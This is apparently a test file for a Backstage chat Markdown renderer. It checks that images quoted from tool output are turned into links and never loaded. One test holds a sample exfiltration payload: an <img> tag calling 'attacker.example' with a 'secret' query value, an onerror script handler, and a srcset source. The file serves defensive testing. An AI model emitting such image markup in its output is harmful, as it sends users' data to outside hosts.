import { renderInTestApp } from '@backstage/test-utils';
import { screen } from '@testing-library/react';
import Markdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { createMarkdownComponents, useMarkdownStyles } from './MarkdownText';
import { chatRehypePlugins } from './chatRehypePlugins';

const loaders = 'img, picture, source, video, audio, iframe, [src], [srcset]';

const ChatMarkdown = ({ text }: { text: string }) => {
  const classes = useMarkdownStyles();
  return (
    <Markdown
      remarkPlugins={[remarkGfm]}
      rehypePlugins={chatRehypePlugins}
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      components={createMarkdownComponents(classes) as any}
    >
      {text}
    </Markdown>
  );
};

describe('chat markdown', () => {
  it('loads nothing from an <img> quoted out of tool output', async () => {
    const { container } = await renderInTestApp(
      <ChatMarkdown
        text={
          'Tool said:\n\n<img src="https://attacker.example/pixel.png?d=secret" alt="pixel" onerror="alert(1)">\n\n<picture><source srcset="https://attacker.example/a.png"></picture>'
        }
      />,
    );

    expect(container.querySelector(loaders)).toBeNull();
    expect(container.querySelector('[onerror]')).toBeNull();
    expect(screen.getByRole('link', { name: /Image: pixel/ })).toHaveAttribute(
      'href',
      'https://attacker.example/pixel.png?d=secret',
    );
  });

  it('renders a Markdown image as a link instead of loading it', async () => {
    const { container } = await renderInTestApp(
      <ChatMarkdown text="![chart](https://example.com/chart.png)" />,
    );

    expect(container.querySelector(loaders)).toBeNull();
    expect(screen.getByRole('link', { name: /Image: chart/ })).toBeVisible();
  });

  it('keeps <details> blocks', async () => {
    const { container } = await renderInTestApp(
      <ChatMarkdown
        text={'<details><summary>Logs</summary>\n\nline one\n\n</details>'}
      />,
    );

    expect(container.querySelector('details > summary')).toHaveTextContent(
      'Logs',
    );
    expect(screen.getByText('line one')).toBeInTheDocument();
  });
});
